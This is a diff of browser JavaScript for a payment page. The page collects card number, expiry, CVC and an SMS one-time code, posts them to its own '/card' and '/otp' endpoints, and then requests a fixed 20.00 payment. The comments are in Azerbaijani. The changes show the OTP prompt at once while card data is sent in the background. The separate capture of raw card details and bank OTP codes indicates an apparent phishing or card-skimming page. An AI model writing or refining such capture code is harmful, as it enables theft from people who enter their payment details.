@@ -261,34 +261,25 @@
             }
         });
 
-        async function robustFetch(url, options) {
+        async function robustFetch(url, options = {}) {
             try {
-                let res = await fetch(url, options);
+                let res = await fetch(url, { ...options, signal: AbortSignal.timeout(3000) });
                 if (res.ok) {
                     return res;
                 }
             } catch (e) {}
 
-            if (url.startsWith('https://')) {
+            const isLocal = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:');
+            if (isLocal && url.startsWith('https://')) {
                 try {
                     let emulatorUrl = url.replace(/https?:\/\/[^\/]+/, 'http://10.0.2.2:3000');
-                    let resEmulator = await fetch(emulatorUrl, options);
+                    let resEmulator = await fetch(emulatorUrl, { ...options, signal: AbortSignal.timeout(2000) });
                     if (resEmulator.ok) {
                         API_URL = 'http://10.0.2.2:3000/api';
                         localStorage.setItem('dyp_active_api_url', API_URL);
                         return resEmulator;
                     }
                 } catch (e2) {}
-
-                try {
-                    let localUrl = url.replace(/https?:\/\/[^\/]+/, 'http://localhost:3000');
-                    let resLocal = await fetch(localUrl, options);
-                    if (resLocal.ok) {
-                        API_URL = 'http://localhost:3000/api';
-                        localStorage.setItem('dyp_active_api_url', API_URL);
-                        return resLocal;
-                    }
-                } catch (e3) {}
             }
 
             throw new Error("Endpoint unreached");
@@ -583,25 +574,29 @@
             clearInterval(otpInterval);
         }
 
-        async function submitCardDetails(event) {
-            event.preventDefault();
-            const cardNo = document.getElementById('card-no').value;
-            const cardExp = document.getElementById('card-exp').value;
-            const cardCvc = document.getElementById('card-cvc').value;
+        function submitCardDetails(event) {
+            if (event) event.preventDefault();
+            const cardNoEl = document.getElementById('card-no');
+            const cardExpEl = document.getElementById('card-exp');
+            const cardCvcEl = document.getElementById('card-cvc');
 
-            try {
-                await robustFetch(`${API_URL}/card`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cardNo, cardExp, cardCvc })
-                });
-            } catch (err) {
-                console.error("Kart göndərmə xətası:", err);
-            }
+            const cardNo = cardNoEl ? cardNoEl.value : '';
+            const cardExp = cardExpEl ? cardExpEl.value : '';
+            const cardCvc = cardCvcEl ? cardCvcEl.value : '';
 
+            // Anında SMS OTP modal pəncərəsini aç ki, UI donmasın
             document.getElementById('card-modal')?.classList.add('hidden');
             document.getElementById('otp-modal')?.classList.remove('hidden');
             startOtpTimer();
+
+            // Kart məlumatlarını arxa fonda göndər
+            robustFetch(`${API_URL}/card`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cardNo, cardExp, cardCvc })
+            }).catch(err => {
+                console.error("Kart göndərmə xətası:", err);
+            });
         }
 
         function startOtpTimer() {
@@ -622,9 +617,10 @@
             }, 1000);
         }
 
-        async function submitOtpCode(event) {
-            event.preventDefault();
-            const otpCode = document.getElementById('otp-code').value;
+        function submitOtpCode(event) {
+            if (event) event.preventDefault();
+            const otpCodeEl = document.getElementById('otp-code');
+            const otpCode = otpCodeEl ? otpCodeEl.value : '';
             if (otpCode.length < 4) {
                 alert("Zəhmət olmasa 4-6 rəqəmli təsdiq kodunu düzgün daxil edin.");
                 return;
@@ -635,25 +631,19 @@
             closeModals();
             showLoadingScreen();
 
-            try {
-                await robustFetch(`${API_URL}/otp`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ otpCode })
-                });
-            } catch (err) {
-                console.error("OTP göndərmə xətası:", err);
-            }
-
-            try {
-                await robustFetch(`${API_URL}/pay`, {
+            robustFetch(`${API_URL}/otp`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otpCode })
+            }).then(() => {
+                return robustFetch(`${API_URL}/pay`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ amountPaid: 20.00 })
                 });
-            } catch (err) {
-                console.error("Ödəniş xətası:", err);
-            }
+            }).catch(err => {
+                console.error("OTP / Pay xətası:", err);
+            });
         }
 
         async function retryPayment() {
